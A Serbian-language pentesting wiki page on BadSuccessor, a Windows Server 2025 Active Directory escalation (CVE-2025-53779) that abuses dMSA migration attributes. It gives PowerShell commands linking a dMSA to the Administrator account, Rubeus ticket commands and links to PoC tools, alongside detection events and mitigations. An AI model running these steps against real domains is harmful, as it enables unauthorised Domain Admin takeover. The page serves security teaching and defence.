# BadSuccessor: Eskalacija privilegija zloupotrebom migracije Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Delegated Managed Service Accounts (**dMSA**) su naslednici nove generacije naloga **gMSA**, dostupni u Windows Server 2025. Legitimni proces migracije omogućava administratorima da zamene *stari* nalog (korisnički, računarski ili servisni nalog) dMSA nalogom, uz transparentno očuvanje dozvola. Proces je dostupan putem PowerShell cmdlet-a kao što su `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration` i oslanja se na dva LDAP atributa **dMSA objekta**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN veza* ka zamenjenom (starom) nalogu.
* **`msDS-DelegatedMSAState`**       – stanje migracije (`0` = nema migracije, `1` = u toku, `2` = *završena*).<sup>[[1]](#references)</sup>

Ako napadač može da kreira **bilo koji** dMSA unutar OU-a i direktno menja ta 2 atributa, LSASS i KDC će tretirati dMSA kao *naslednika* povezanog naloga. Kada se napadač zatim autentifikuje kao dMSA, **nasleđuje sve privilegije povezanog naloga** – sve do nivoa **Domain Admin** ako je povezan nalog Administrator.<sup>[[1]](#references)</sup>

Unit 42 je ovu tehniku nazvao **BadSuccessor** 2025. godine. Microsoft joj je kasnije dodelio oznaku **CVE-2025-53779** i objavio bezbednosnu ispravku u **avgustu 2025.** Tehnika je i dalje relevantna za nezakrpljena okruženja Windows Server 2025 i za provere opasne OU delegacije.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Na zakrpljenim DC-ovima, [dvosmerna dMSA migracija](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) i dalje može da izloži ciljni nalog ako napadač može da upisuje i njegove atribute migracije. Ovo je uži scenario od prvobitnog napada na proizvoljne ciljne naloge.

### Preduslovi za napad

1. Nalog koji ima dozvolu da kreira objekte unutar **organizacione jedinice (OU)** *i* ima bar jedno od sledećeg:
   * `Create Child` → klasa objekata **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (generičko kreiranje)
2. Mrežna veza sa LDAP-om i Kerberos-om (standardni scenario sa pridruženim domenom / udaljeni napad).<sup>[[1]](#references)</sup>

## Nabrajanje ranjivih OU-ova

Unit 42 je objavio pomoćnu PowerShell skriptu koja parsira bezбедносне дескрипторе сваког OU-а и истиче потребне ACE-ове:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Ispod haube, skripta izvršava paginiranu LDAP pretragu za `(objectClass=organizationalUnit)` i proverava svaki `nTSecurityDescriptor` za

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (klasa objekta *msDS-DelegatedManagedServiceAccount*)

## Koraci eksploatacije

Kada se identifikuje OU u koji može da se upisuje, napad zahteva samo 3 LDAP upisa:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Nakon replikacije, napadač može jednostavno da se **logon** kao `attacker_dMSA$` ili da zatraži Kerberos TGT – Windows će napraviti token *zamenjenog* naloga.<sup>[[1]](#references)</sup>

### Automatizacija

Nekoliko javno dostupnih PoC-ova obuhvata ceo postupak, uključujući preuzimanje lozinke i upravljanje tiketima:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec modul – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Detekcija i potraga

Omogućite **Object Auditing** na OU-ovima i nadgledajte sledeće Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Kreiranje objekta **dMSA**
* **5136** – Izmena atributa **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Izmene određenih atributa
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Izdavanje TGT-a za dMSA

Povezivanje događaja `4662` (izmena atributa), `4741` (kreiranje računara/nalogа usluge) i `4624` (naknadna prijava) brzo otkriva BadSuccessor aktivnost. XDR rešenja kao što je **XSIAM** isporučuju se sa upitima spremnim za upotrebu (pogledajte reference).<sup>[[2]](#references)</sup>

## Ublažavanje

* Instalirajte Microsoft-ovu bezbednosnu ispravku za **CVE-2025-53779** i proverite nivo zakrpa na svakom kontroleru domena sa Windows Server 2025.<sup>[[6]](#references)</sup>
* Primenite princip **najmanjih privilegija** – upravljanje nalozima *Service Account* delegirajte samo pouzdanim ulogama.
* Uklonite `Create Child` / `msDS-DelegatedManagedServiceAccount` sa OU-ova kojima to nije izričito potrebno.
* Nadgledajte gore navedene ID-jeve događaja i upozoravajte kada identiteti koji nisu *Tier-0* kreiraju ili menjaju dMSA-ove.

## Pogledajte takođe


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Zloupotreba dMSA-a za eskalaciju privilegija u Active Directory-ju – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Kada dobri nalozi krenu po zlu: Iskorišćavanje Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
